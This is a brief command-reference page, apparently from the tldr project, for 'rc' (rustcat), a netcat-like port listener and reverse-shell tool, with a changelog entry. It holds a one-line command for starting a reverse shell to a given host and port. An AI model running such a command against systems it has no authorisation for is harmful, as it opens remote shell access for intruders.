---
author: ['Joshua Shanks']
date: 1633607430
title: "rc"
description: "rc, A modern simplistic port listener & reverse shell."
categories: "common"
---
> Similar to `nc`.

> More information: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Start listening on a specific port:

```bash
rc -lp port
```

- Start a reverse shell:

```bash
rc host port -r shell
```
List of changes to this documentation


Author | Description | ISO 8601 Date | GitHub link
------|-----|-----|-----
[Joshua Shanks](mailto:jjshanks@gmail.com) | rc: add page (#6831) | 2021-10-07T13:50:30 | [e36515eb027f](https://github.com/tldr-pages/tldr/commit/e36515eb027f3dc6cb6a8bd8963634083247569f)

